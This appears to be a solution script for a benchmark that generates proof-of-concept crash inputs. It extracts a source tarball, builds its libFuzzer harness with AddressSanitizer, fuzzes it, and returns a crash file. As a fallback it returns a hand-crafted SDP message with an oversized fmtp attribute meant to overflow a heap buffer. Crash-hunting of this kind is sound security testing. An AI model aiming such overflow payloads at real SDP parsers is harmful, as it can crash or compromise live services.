import os
import subprocess
import tempfile
import glob

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Fallback payload: constructed based on typical SDP heap buffer overflows
        # (e.g. missing bounds check when parsing attributes or values)
        # Length targeted around 873 bytes (ground truth)
        fallback_payload = (
            b"v=0\r\n"
            b"o=user 1234567890 1234567890 IN IP4 127.0.0.1\r\n"
            b"s=Session Description\r\n"
            b"i=Information\r\n"
            b"u=http://example.com\r\n"
            b"e=root@example.com\r\n"
            b"c=IN IP4 127.0.0.1\r\n"
            b"t=0 0\r\n"
            b"m=audio 12345 RTP/AVP 0\r\n"
            b"a=rtpmap:0 PCMU/8000\r\n"
            b"a=fmtp:0 " + b"A" * 600 + b"\r\n"
            b"m=video 54321 RTP/AVP 99\r\n"
            b"a=rtpmap:99 H264/90000\r\n"
            b"a=" + b"B" * 100
        )

        with tempfile.TemporaryDirectory() as work_dir:
            # 1. Extract source code
            try:
                subprocess.run(['tar', '-xf', src_path, '-C', work_dir], 
                               check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)
            except Exception:
                return fallback_payload

            # 2. Locate source root
            src_root = work_dir
            entries = os.listdir(work_dir)
            if len(entries) == 1 and os.path.isdir(os.path.join(work_dir, entries[0])):
                src_root = os.path.join(work_dir, entries[0])

            # 3. Find Fuzz Harness (LLVMFuzzerTestOneInput)
            harness_file = None
            for root, _, files in os.walk(src_root):
                for f in files:
                    if f.endswith(('.c', '.cc', '.cpp')):
                        fpath = os.path.join(root, f)
                        try:
                            with open(fpath, 'r', encoding='latin-1') as fp:
                                if 'LLVMFuzzerTestOneInput' in fp.read():
                                    harness_file = fpath
                                    break
                        except:
                            pass
                if harness_file: break

            if not harness_file:
                return fallback_payload

            # 4. Identify Compilation Sources
            # Compile all .c files in the project, but exclude files with main() 
            # (except the harness if it has one, though usually it relies on libFuzzer main)
            sources = []
            include_dirs = set()
            
            for root, dirs, files in os.walk(src_root):
                if any(f.endswith('.h') for f in files):
                    include_dirs.add(root)
                for f in files:
                    if f.endswith('.c'):
                        sources.append(os.path.join(root, f))
            
            compile_sources = []
            for s in sources:
                if s == harness_file:
                    compile_sources.append(s)
                    continue
                try:
                    with open(s, 'r', encoding='latin-1') as fp:
                        content = fp.read()
                        # Simple heuristic to avoid linking conflicts with existing tools/tests
                        if 'main(' not in content and 'main (' not in content:
                            compile_sources.append(s)
                except:
                    pass

            # 5. Compile Fuzzer
            fuzzer_exe = os.path.join(work_dir, 'fuzzer')
            cmd = ['clang', '-fsanitize=address,fuzzer', '-g', '-O1', '-o', fuzzer_exe]
            for inc in include_dirs:
                cmd.extend(['-I', inc])
            # Common flags for C projects
            cmd.extend(['-D_GNU_SOURCE', '-D_REENTRANT'])
            cmd.extend(compile_sources)

            try:
                subprocess.run(cmd, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                return fallback_payload

            # 6. Run Fuzzer
            corpus_dir = os.path.join(work_dir, 'corpus')
            os.makedirs(corpus_dir, exist_ok=True)
            
            # Create a valid seed to help the fuzzer start
            seed = (
                b"v=0\r\n"
                b"o=- 12345 12345 IN IP4 127.0.0.1\r\n"
                b"s=Session\r\n"
                b"c=IN IP4 127.0.0.1\r\n"
                b"t=0 0\r\n"
                b"m=audio 49170 RTP/AVP 0\r\n"
                b"a=rtpmap:0 PCMU/8000\r\n"
            )
            with open(os.path.join(corpus_dir, 'seed'), 'wb') as f:
                f.write(seed)

            # Run with parallelism
            fuzz_cmd = [
                fuzzer_exe, 
                corpus_dir, 
                '-max_total_time=40', 
                '-jobs=4', 
                '-workers=4', 
                '-print_final_stats=0',
                '-artifact_prefix=crash-'
            ]
            
            try:
                subprocess.run(fuzz_cmd, cwd=work_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass

            # 7. Harvest Crash
            crashes = glob.glob(os.path.join(work_dir, 'crash-*'))
            if crashes:
                # If multiple crashes, pick the largest one assuming it matches the complexity hint
                # Or just the first one.
                crashes.sort(key=os.path.getsize, reverse=True)
                with open(crashes[0], 'rb') as f:
                    return f.read()
            
            return fallback_payload